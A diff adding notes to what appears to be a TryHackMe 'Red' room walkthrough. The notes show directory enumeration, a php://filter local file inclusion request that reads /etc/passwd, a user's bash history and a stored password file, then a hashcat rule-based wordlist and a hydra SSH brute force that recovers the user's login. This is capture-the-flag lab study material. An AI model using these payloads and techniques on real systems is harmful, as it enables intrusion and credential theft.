@@ -22,10 +22,10 @@ Nmap done: 1 IP address (1 host up) scanned in 33.37 seconds
 
 ┌──(duke㉿kali)-[~/Documents/THM_Red]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://red.thm -x php,txt,html
-===============================================================
+
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
+
 [+] Url:                     http://red.thm
 [+] Method:                  GET
 [+] Threads:                 10
@@ -34,9 +34,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.1.0
 [+] Extensions:              txt,html,php
 [+] Timeout:                 10s
-===============================================================
+
 2024/05/29 02:52:10 Starting gobuster in directory enumeration mode
-===============================================================
+
 /index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
 /contact.html         (Status: 200) [Size: 7507]                             
 /about.html           (Status: 200) [Size: 9309]                             
@@ -48,5 +48,51 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /signin.html          (Status: 200) [Size: 6655]                             
 /readme.txt           (Status: 200) [Size: 675]                              
 /server-status        (Status: 403) [Size: 272]  
+
+### get local file
+GET http://red.thm/index.php?page=php://filter/resource=/etc/passwd HTTP/1.1
+
+root:x:0:0:root:/root:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+blue:x:1000:1000:blue:/home/blue:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+red:x:1001:1001::/home/red:/bin/bash
+
+### reply from bash history 
+http://red.thm/index.php?page=php://filter/resource=/home/blue/.bash_history
+echo "Red rules" cd hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt cat passlist.txt rm passlist.txt sudo apt-get remove hashcat -y 
+http://red.thm/index.php?page=php://filter/resource=/home/blue/.reminder
+sup3r_p@s$w0rd! 
+
+
+┌──(duke㉿kali)-[~/Documents/THM_Red]
+└─$ hashcat --stdout reminder -r ../../../..//usr/share/hashcat/rules/best64.rule > passlist.txt 
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[~/Documents/THM_Red]
+└─$ cat passlist.txt         
+sup3r_p@s$w0rd!
+!dr0w$s@p_r3pus
+SUP3R_P@S$W0RD!
+Sup3r_p@s$w0rd!
+....
+
+### Use hydra to brute force
+┌──(duke㉿kali)-[~/Documents/THM_Red]
+└─$ hydra -l blue -P passlist.txt ssh://10.10.141.213
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-30 06:22:25
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
+[DATA] attacking ssh://10.10.141.213:22/
+[22][ssh] host: 10.10.141.213   login: blue   password: sup3r_p@s$w0rd!9
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 06:22:29
+
+## Credentials login: blue   password: sup3r_p@s$w0rd!9
+
 
 </code>
